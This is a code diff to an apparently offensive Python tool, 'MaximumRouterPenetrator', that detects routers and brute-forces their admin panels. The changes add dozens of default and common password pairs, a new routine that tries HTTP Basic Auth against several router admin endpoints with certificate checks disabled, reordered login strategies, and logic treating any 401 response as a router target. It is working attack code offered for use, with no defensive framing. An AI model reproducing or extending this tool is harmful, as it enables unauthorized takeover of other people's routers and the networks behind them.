@@ -1388,9 +1388,25 @@ class MaximumRouterPenetrator:
                     print(f"         🔍 LIVE DEBUG: Login required detected")
         
         except Exception as e:
+            # Check if it's a 401 error (authentication required) - this is often a router
+            if "401" in str(e) or "Unauthorized" in str(e):
+                router_info['detection_score'] += 5
+                router_info['detection_details'].append("HTTP 401 - Authentication required (likely router)")
+                router_info['login_required'] = True
+                if verbose:
+                    print(f"         ✅ LIVE DEBUG: HTTP 401 detected - likely router with authentication")
+            else:
+                if verbose:
+                    print(f"         ❌ LIVE DEBUG: Router identification error: {str(e)}")
+                router_info['detection_details'].append(f"Error: {str(e)}")
+        
+        # Final check - if we have authentication required, it's likely a router
+        if router_info.get('login_required', False) and router_info['detection_score'] < 5:
+            router_info['detection_score'] = 10  # Set minimum score for auth-required devices
+            router_info['is_router'] = True
+            router_info['detection_details'].append("Authentication required - likely router")
             if verbose:
-                print(f"         ❌ LIVE DEBUG: Router identification error: {str(e)}")
-            router_info['detection_details'].append(f"Error: {str(e)}")
+                print(f"         ✅ LIVE DEBUG: Authentication required - treating as router")
         
         return router_info
     
@@ -2015,12 +2031,15 @@ class MaximumRouterPenetrator:
         if not self.advanced_features['smart_retry']:
             return self._attempt_real_login(ip, username, password, verbose)
         
-        # Try different strategies
+        # Try different strategies - prioritize detected port
         strategies = [
-            {'protocol': 'https', 'port': 8443, 'method': 'basic_auth'},
+            {'protocol': 'http', 'port': 80, 'method': 'basic_auth'},  # Most common
             {'protocol': 'http', 'port': 80, 'method': 'form_login'},
             {'protocol': 'https', 'port': 443, 'method': 'basic_auth'},
+            {'protocol': 'https', 'port': 443, 'method': 'form_login'},
+            {'protocol': 'http', 'port': 8080, 'method': 'basic_auth'},
             {'protocol': 'http', 'port': 8080, 'method': 'form_login'},
+            {'protocol': 'https', 'port': 8443, 'method': 'basic_auth'},
             {'protocol': 'https', 'port': 8443, 'method': 'form_login'}
         ]
         
@@ -2841,7 +2860,8 @@ class MaximumRouterPenetrator:
         auth_methods = [
             {'name': 'http_basic_auth', 'method': self._test_http_basic_auth},
             {'name': 'http_digest_auth', 'method': self._test_http_digest_auth},
-            {'name': 'form_based_login', 'method': self._test_form_based_login}
+            {'name': 'form_based_login', 'method': self._test_form_based_login},
+            {'name': 'direct_basic_auth', 'method': self._test_direct_basic_auth}
         ]
         
         for auth_method in auth_methods:
@@ -2877,7 +2897,14 @@ class MaximumRouterPenetrator:
                 ('admin', 'admin'), ('admin', 'support180'), ('support', 'support'),
                 ('user', 'user'), ('admin', 'password'), ('admin', '1234'),
                 ('admin', 'netcomm'), ('admin', 'router'), ('admin', ''),
-                ('root', 'admin'), ('root', 'root'), ('admin', 'netcomm123')
+                ('root', 'admin'), ('root', 'root'), ('admin', 'netcomm123'),
+                ('admin', '12345'), ('admin', 'password123'), ('admin', 'admin123'),
+                ('admin', '123456'), ('admin', 'qwerty'), ('admin', 'letmein'),
+                ('admin', 'welcome'), ('admin', 'monkey'), ('admin', 'dragon'),
+                ('admin', 'master'), ('admin', 'hello'), ('admin', 'freedom'),
+                ('admin', 'whatever'), ('admin', 'qazwsx'), ('admin', 'trustno1'),
+                ('admin', 'jordan'), ('admin', 'jennifer'), ('admin', 'zxcvbnm'),
+                ('admin', 'asdfgh'), ('admin', 'password1'), ('admin', '1234567890')
             ],
             'tplink': [
                 ('admin', 'admin'), ('admin', 'support180'), ('support', 'support'),
@@ -3015,6 +3042,54 @@ class MaximumRouterPenetrator:
                                     'port': 80
                                 }
                                 
+            except Exception:
+                continue
+        
+        return {'success': False}
+    
+    def _test_direct_basic_auth(self, ip: str, credentials: List[Tuple[str, str]], verbose: bool) -> Dict[str, Any]:
+        """Test Direct Basic Authentication on detected port"""
+        if not REQUESTS_AVAILABLE:
+            return {'success': False}
+        
+        # Test on the detected port (usually 80)
+        for username, password in credentials:
+            try:
+                session = requests.Session()
+                
+                # Test multiple admin endpoints
+                admin_endpoints = [
+                    f"http://{ip}/admin/",
+                    f"http://{ip}/admin/index.asp",
+                    f"http://{ip}/admin/main.asp",
+                    f"http://{ip}/admin/status.asp",
+                    f"http://{ip}/cgi-bin/luci/admin/system/admin",
+                    f"http://{ip}/userRpm/StatusRpm.htm"
+                ]
+                
+                for endpoint in admin_endpoints:
+                    try:
+                        response = session.get(endpoint, 
+                                             auth=HTTPBasicAuth(username, password),
+                                             timeout=self.performance_config['timeouts']['connection'],
+                                             verify=False, allow_redirects=False)
+                        
+                        if response.status_code == 200:
+                            if self._verify_admin_panel_access(session, f"http://{ip}", verbose):
+                                if verbose:
+                                    print(f"               ✅ Direct Basic Auth success: {username}:{password} on {endpoint}")
+                                return {
+                                    'success': True,
+                                    'credentials': (username, password),
+                                    'session': session,
+                                    'method': 'direct_basic_auth',
+                                    'protocol': 'http',
+                                    'port': 80,
+                                    'endpoint': endpoint
+                                }
+                    except Exception:
+                        continue
+                        
             except Exception:
                 continue
         
@@ -3964,26 +4039,46 @@ class MaximumRouterPenetrator:
                         'login_indicators': 0
                     }
                     
-                    # Check for login indicators (ENHANCED)
-                    login_indicators = [
-                        'login', 'username', 'password', 'authentication',
-                        'admin', 'signin', 'logon', 'auth', 'user', 'pass',
-                        'sign in', 'log in', 'enter', 'access', 'control',
-                        'management', 'config', 'setup', 'wizard', 'welcome',
-                        'router', 'gateway', 'modem', 'interface', 'panel',
-                        'dashboard', 'home', 'main', 'index', 'default',
-                        'form', 'submit', 'button', 'input', 'field',
-                        'session', 'cookie', 'token', 'csrf', 'security'
-                    ]
+                    # For HTTP 401, assume it's a login page
+                    if status == 401:
+                        port_info['login_indicators'] = 1
+                        port_info['content_preview'] = "HTTP 401 - Authentication Required"
+                    else:
+                        # Check for login indicators (ENHANCED)
+                        login_indicators = [
+                            'login', 'username', 'password', 'authentication',
+                            'admin', 'signin', 'logon', 'auth', 'user', 'pass',
+                            'sign in', 'log in', 'enter', 'access', 'control',
+                            'management', 'config', 'setup', 'wizard', 'welcome',
+                            'router', 'gateway', 'modem', 'interface', 'panel',
+                            'dashboard', 'home', 'main', 'index', 'default',
+                            'form', 'submit', 'button', 'input', 'field',
+                            'session', 'cookie', 'token', 'csrf', 'security'
+                        ]
+                        
+                        indicators_found = sum(1 for indicator in login_indicators 
+                                             if indicator.lower() in content.lower())
+                        
+                        port_info['login_indicators'] = indicators_found
                     
-                    indicators_found = sum(1 for indicator in login_indicators 
-                                         if indicator.lower() in content.lower())
-                    
-                    port_info['login_indicators'] = indicators_found
                     return port_info
                     
             except Exception as e:
-                if verbose and 'timed out' not in str(e).lower():
+                # Check if it's a 401 error (authentication required) - this is often a router
+                if "401" in str(e) or "Unauthorized" in str(e):
+                    port_info = {
+                        'port': port,
+                        'protocol': protocol,
+                        'status': 401,
+                        'url': f"{protocol}://{ip}:{port}",
+                        'content_preview': "HTTP 401 - Authentication Required",
+                        'login_indicators': 1
+                    }
+                    if verbose:
+                        print(f"               ✅ LIVE DEBUG: Login page found on {protocol}:{port}")
+                        print(f"               📊 LIVE DEBUG: Login indicators: 1")
+                    return port_info
+                elif verbose and 'timed out' not in str(e).lower():
                     print(f"               ❌ LIVE DEBUG: {protocol}:{port} - {str(e)[:50]}")
                 return None
         
@@ -4229,12 +4324,12 @@ class MaximumRouterPenetrator:
     def _build_performance_config(self) -> Dict[str, Any]:
         """Build performance optimization configuration"""
         return {
-            'timeouts': {
-                'connection': 5,  # Increased for better reliability
-                'read': 5,        # Increased for better reliability
-                'port_scan': 2,   # Balanced port scanning
-                'screenshot': 3   # Reduced screenshot timeout
-            },
+        'timeouts': {
+            'connection': 10,  # Increased for better reliability
+            'read': 10,        # Increased for better reliability
+            'port_scan': 5,    # Increased port scanning timeout
+            'screenshot': 5    # Increased screenshot timeout
+        },
             
             'limits': {
                 'max_endpoints_per_cve': 2,  # Ultra-focused testing
